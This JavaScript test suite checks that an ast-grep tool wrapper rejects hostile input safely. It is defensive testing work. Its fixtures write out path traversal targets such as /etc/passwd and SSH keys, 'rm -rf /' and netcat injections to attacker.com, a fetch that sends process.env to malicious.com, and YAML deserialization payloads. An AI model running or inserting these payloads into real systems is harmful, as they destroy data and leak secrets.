/**
 * Security and Validation Tests
 * Tests for security vulnerabilities, input validation, and malicious input handling
 */

import { SearchTool } from '../../build/tools/search.js';
import { ReplaceTool } from '../../build/tools/replace.js';
import { ScanTool } from '../../build/tools/scan.js';
import { AstGrepBinaryManager } from '../../build/core/binary-manager.js';
import { WorkspaceManager } from '../../build/core/workspace-manager.js';
import { ValidationError, ExecutionError, SecurityError } from '../../build/types/errors.js';
import { TestSuite, TestAssert, withTimeout } from '../utils/test-helpers.js';
import fs from 'fs/promises';
import path from 'path';
import { tmpdir } from 'os';

export default async function runSecurityValidationTests() {
  const suite = new TestSuite('Security and Validation Tests');

  let binaryManager;
  let workspaceManager;
  let searchTool;
  let replaceTool;
  let scanTool;
  let tempDir;

  suite.beforeAll(async () => {
    binaryManager = new AstGrepBinaryManager({ useSystem: true });
    workspaceManager = new WorkspaceManager();
    searchTool = new SearchTool(binaryManager, workspaceManager);
    replaceTool = new ReplaceTool(binaryManager, workspaceManager);
    scanTool = new ScanTool(binaryManager, workspaceManager);

    try {
      await binaryManager.initialize();
    } catch (error) {
      console.log('  ⚠️  Binary manager initialization failed:', error.message);
    }

    tempDir = await fs.mkdtemp(path.join(tmpdir(), 'ast-grep-security-test-'));
  });

  suite.afterAll(async () => {
    try {
      await fs.rm(tempDir, { recursive: true, force: true });
    } catch (error) {
      console.log('  ⚠️  Failed to clean up temp directory');
    }
  });

  // =============================================================================
  // PATH TRAVERSAL AND DIRECTORY SECURITY TESTS
  // =============================================================================

  suite.test('should prevent path traversal attacks', async () => {
    const pathTraversalAttempts = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
      'C:\\Windows\\System32\\drivers\\etc\\hosts',
      '../../../../../../../../etc/passwd',
      '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32',
      '/proc/self/environ',
      '/dev/kmem',
      '\\\\server\\share\\sensitive',
      'file:///etc/passwd',
      'http://malicious.com/payload',
      '/root/.ssh/id_rsa',
      'C:\\Users\\Administrator\\Desktop\\sensitive.txt'
    ];

    for (const maliciousPath of pathTraversalAttempts) {
      console.log(`  🔍 Testing path traversal: ${maliciousPath}`);

      try {
        const result = await searchTool.execute({
          pattern: 'console.log($ARG)',
          language: 'javascript',
          paths: [maliciousPath],
          timeoutMs: 5000
        });

        // If it doesn't throw, it should return a safe result
        TestAssert.assertTrue(typeof result === 'object');
        TestAssert.assertTrue('matches' in result);

        // Should not have accessed sensitive files
        if (result.matches && result.matches.length > 0) {
          result.matches.forEach(match => {
            TestAssert.assertFalse(match.file.includes('passwd'));
            TestAssert.assertFalse(match.file.includes('shadow'));
            TestAssert.assertFalse(match.file.includes('SAM'));
            TestAssert.assertFalse(match.file.includes('id_rsa'));
          });
        }

      } catch (error) {
        // Security errors, file not found, or permission errors are acceptable
        TestAssert.assertTrue(error instanceof Error);
        TestAssert.assertTrue(
          error.message.includes('not found') ||
          error.message.includes('permission') ||
          error.message.includes('access') ||
          error.message.includes('denied') ||
          error.message.includes('ast-grep not found') ||
          error instanceof SecurityError ||
          error instanceof ValidationError
        );
      }
    }
  });

  suite.test('should validate workspace boundaries', async () => {
    const workspaceRoot = workspaceManager.getWorkspaceRoot();

    // Attempts to access files outside workspace
    const outsideWorkspaceAttempts = [
      path.join(workspaceRoot, '../../../etc/passwd'),
      path.join(workspaceRoot, '..', '..', 'sensitive-file.txt'),
      path.resolve(workspaceRoot, '../../../root/.bashrc')
    ];

    for (const outsidePath of outsideWorkspaceAttempts) {
      const validation = workspaceManager.validatePath(outsidePath);

      TestAssert.assertTrue(typeof validation === 'object');
      TestAssert.assertTrue('valid' in validation);

      if (validation.valid) {
        // If considered valid, the resolved path should be safe
        TestAssert.assertTrue('resolvedPath' in validation);
        const resolvedPath = validation.resolvedPath;

        // Should either be within workspace or a safe system location
        TestAssert.assertTrue(
          resolvedPath.startsWith(workspaceRoot) ||
          resolvedPath.includes('node_modules') ||
          !resolvedPath.includes('etc/passwd') &&
          !resolvedPath.includes('shadow') &&
          !resolvedPath.includes('id_rsa')
        );
      } else {
        // Invalid paths should have error messages
        TestAssert.assertTrue('error' in validation);
        TestAssert.assertTrue(typeof validation.error === 'string');
      }
    }
  });

  // =============================================================================
  // CODE INJECTION AND MALICIOUS PATTERN TESTS
  // =============================================================================

  suite.test('should handle malicious patterns safely', async () => {
    const maliciousPatterns = [
      // Patterns that might cause infinite loops
      '($A)+',
      '($A)*',
      '($A){999999}',

      // Patterns with potential command injection
      '$(rm -rf /)',
      '$(cat /etc/passwd)',
      '`rm -rf /`',
      '${process.exit(1)}',

      // Patterns with potential regex DoS
      '(a+)+b',
      '([a-zA-Z0-9])+@([a-zA-Z0-9])+',

      // Extremely long patterns
      'a'.repeat(10000),

      // Patterns with null bytes and control characters
      'console.log(\0)',
      'console.log(\x00)',
      'console.log(\r\n)',

      // Patterns attempting to escape syntax
      'console.log($ARG); rm -rf /',
      'console.log($ARG) && exit(1)',
      'console.log($ARG) | nc attacker.com 4444'
    ];

    for (const maliciousPattern of maliciousPatterns) {
      console.log(`  🦠 Testing malicious pattern: ${maliciousPattern.substring(0, 50)}...`);

      try {
        const result = await withTimeout(
          searchTool.execute({
            pattern: maliciousPattern,
            language: 'javascript',
            code: 'console.log("safe code");',
            timeoutMs: 3000
          }),
          5000
        );

        // If it completes, should return safe result
        TestAssert.assertTrue(typeof result === 'object');
        TestAssert.assertTrue('matches' in result);

      } catch (error) {
        // Should be proper error handling, not system compromise
        TestAssert.assertTrue(error instanceof Error);
        TestAssert.assertTrue(
          error instanceof ValidationError ||
          error instanceof ExecutionError ||
          error.message.includes('timeout') ||
          error.message.includes('ast-grep not found')
        );

        // Should not contain evidence of command execution
        TestAssert.assertFalse(error.message.includes('rm -rf'));
        TestAssert.assertFalse(error.message.includes('/etc/passwd'));
      }
    }
  });

  suite.test('should sanitize replacement patterns', async () => {
    const maliciousReplacements = [
      // Command injection attempts
      'logger.info($ARG); $(rm -rf /)',
      'logger.info($ARG) && cat /etc/passwd',
      'logger.info($ARG) | nc attacker.com 4444',

      // Script injection attempts
      'logger.info($ARG); </script><script>alert("xss")</script>',
      'logger.info($ARG); require("child_process").exec("rm -rf /")',

      // File system manipulation
      'logger.info($ARG); fs.unlinkSync("/important/file")',
      'logger.info($ARG); process.exit(1)',

      // Network requests
      'logger.info($ARG); fetch("http://malicious.com/steal?data=" + JSON.stringify(process.env))'
    ];

    for (const maliciousReplacement of maliciousReplacements) {
      console.log(`  💉 Testing malicious replacement: ${maliciousReplacement.substring(0, 50)}...`);

      try {
        const result = await withTimeout(
          replaceTool.execute({
            pattern: 'console.log($ARG)',
            replacement: maliciousReplacement,
            language: 'javascript',
            code: 'console.log("test");',
            dryRun: true,
            timeoutMs: 3000
          }),
          5000
        );

        // Should return safe result structure
        TestAssert.assertTrue(typeof result === 'object');
        TestAssert.assertTrue('changes' in result || 'summary' in result);

      } catch (error) {
        // Should handle malicious input gracefully
        TestAssert.assertTrue(error instanceof Error);
        TestAssert.assertTrue(
          error instanceof ValidationError ||
          error instanceof ExecutionError ||
          error.message.includes('ast-grep not found')
        );
      }
    }
  });

  // =============================================================================
  // INPUT VALIDATION AND SANITIZATION TESTS
  // =============================================================================

  suite.test('should validate input types strictly', async () => {
    const invalidInputs = [
      // Non-string patterns
      { pattern: null, language: 'javascript', code: 'test' },
      { pattern: undefined, language: 'javascript', code: 'test' },
      { pattern: 123, language: 'javascript', code: 'test' },
      { pattern: {}, language: 'javascript', code: 'test' },
      { pattern: [], language: 'javascript', code: 'test' },
      { pattern: function() {}, language: 'javascript', code: 'test' },

      // Non-string languages
      { pattern: 'test', language: null, code: 'test' },
      { pattern: 'test', language: 123, code: 'test' },
      { pattern: 'test', language: {}, code: 'test' },

      // Non-string code
      { pattern: 'test', language: 'javascript', code: null },
      { pattern: 'test', language: 'javascript', code: 123 },
      { pattern: 'test', language: 'javascript', code: {} },

      // Non-array paths
      { pattern: 'test', language: 'javascript', paths: 'not-array' },
      { pattern: 'test', language: 'javascript', paths: 123 },
      { pattern: 'test', language: 'javascript', paths: {} },

      // Invalid numeric values
      { pattern: 'test', language: 'javascript', code: 'test', context: 'not-number' },
      { pattern: 'test', language: 'javascript', code: 'test', maxMatches: 'not-number' },
      { pattern: 'test', language: 'javascript', code: 'test', timeoutMs: 'not-number' }
    ];

    for (const invalidInput of invalidInputs) {
      try {
        await searchTool.execute(invalidInput);
        TestAssert.assertTrue(false, `Should have thrown validation error for: ${JSON.stringify(invalidInput)}`);
      } catch (error) {
        TestAssert.assertTrue(error instanceof ValidationError || error instanceof ExecutionError);
      }
    }
  });

  suite.test('should handle extremely large inputs safely', async () => {
    const extremeInputs = [
      // Extremely long strings
      {
        pattern: 'a'.repeat(100000),
        language: 'javascript',
        code: 'test'
      },
      {
        pattern: 'console.log($ARG)',
        language: 'javascript',
        code: 'x'.repeat(1000000) // 1MB of code
      },
      {
        pattern: 'console.log($ARG)',
        language: 'x'.repeat(10000), // Very long language name
        code: 'test'
      }
    ];

    for (const extremeInput of extremeInputs) {
      console.log(`  📏 Testing extreme input size...`);

      try {
        const result = await withTimeout(
          searchTool.execute({
            ...extremeInput,
            timeoutMs: 5000
          }),
          10000
        );

        // Should either handle gracefully or return reasonable result
        TestAssert.assertTrue(typeof result === 'object');

      } catch (error) {
        // Should handle with proper error types
        TestAssert.assertTrue(error instanceof Error);
        TestAssert.assertTrue(
          error instanceof ValidationError ||
          error instanceof ExecutionError ||
          error.message.includes('timeout') ||
          error.message.includes('memory') ||
          error.message.includes('ast-grep not found')
        );
      }
    }
  });

  // =============================================================================
  // YAML INJECTION AND SCAN SECURITY TESTS
  // =============================================================================

  suite.test('should prevent YAML injection in scan rules', async () => {
    const yamlInjectionAttempts = [
      // YAML bombs
      `
!!python/object/apply:os.system ["rm -rf /"]
`,

      // Reference loops
      `
a: &anchor
  - *anchor
`,

      // External entity references
      `
rule: !!python/object/apply:subprocess.check_output
  - ["cat", "/etc/passwd"]
`,

      // Code execution attempts
      `
rule:
  pattern: console.log
  language: javascript
!!python/object/apply:eval ["__import__('os').system('rm -rf /')"]
`,

      // Malformed YAML designed to cause parser errors
      `{invalid: yaml: structure: {{{{`,

      // YAML with embedded null bytes
      "rule:\n  pattern: test\x00\n  language: javascript\x00"
    ];

    for (const maliciousYaml of yamlInjectionAttempts) {
      console.log(`  🎯 Testing YAML injection attempt...`);

      try {
        const result = await withTimeout(
          scanTool.execute({
            rule: maliciousYaml,
            code: 'console.log("test");',
            timeoutMs: 3000
          }),
          5000
        );

        // If it doesn't throw, should return safe result
        TestAssert.assertTrue(typeof result === 'object');

      } catch (error) {
        // Should handle malicious YAML gracefully
        TestAssert.assertTrue(error instanceof Error);
        TestAssert.assertTrue(
          error instanceof ValidationError ||
          error instanceof ExecutionError ||
          error.message.includes('yaml') ||
          error.message.includes('parse') ||
          error.message.includes('ast-grep not found')
        );

        // Should not show evidence of command execution
        TestAssert.assertFalse(error.message.includes('rm -rf'));
        TestAssert.assertFalse(error.message.includes('/etc/passwd'));
      }
    }
  });

  // =============================================================================
  // RESOURCE EXHAUSTION SECURITY TESTS
  // =============================================================================

  suite.test('should prevent resource exhaustion attacks', async () => {
    console.log('  💾 Testing resource exhaustion prevention...');

    // Attempt to create many concurrent operations to exhaust resources
    const exhaustionAttempts = Array(50).fill().map((_, i) =>
      searchTool.execute({
        pattern: `console.log($ARG)`,
        language: 'javascript',
        code: Array(1000).fill(`console.log("exhaust ${i}");`).join('\n'),
        timeoutMs: 2000
      })
    );

    try {
      const results = await Promise.allSettled(exhaustionAttempts);

      // System should handle this gracefully
      const successful = results.filter(r => r.status === 'fulfilled').length;
      const failed = results.filter(r => r.status === 'rejected').length;

      console.log(`  ✅ Resource exhaustion test - Successful: ${successful}, Failed: ${failed}`);

      // Should complete all operations (successfully or with proper errors)
      TestAssert.assertEqual(successful + failed, 50);

      // Failures should be proper error types, not system crashes
      results.filter(r => r.status === 'rejected').forEach(result => {
        TestAssert.assertTrue(result.reason instanceof Error);
        TestAssert.assertTrue(
          result.reason instanceof ExecutionError ||
          result.reason instanceof ValidationError ||
          result.reason.message.includes('timeout') ||
          result.reason.message.includes('ast-grep not found')
        );
      });

    } catch (error) {
      if (error.message.includes('ast-grep not found')) {
        console.log('  ⚠️  Skipping resource exhaustion test - ast-grep not available');
        return;
      }
      throw error;
    }
  });

  return suite.run();
}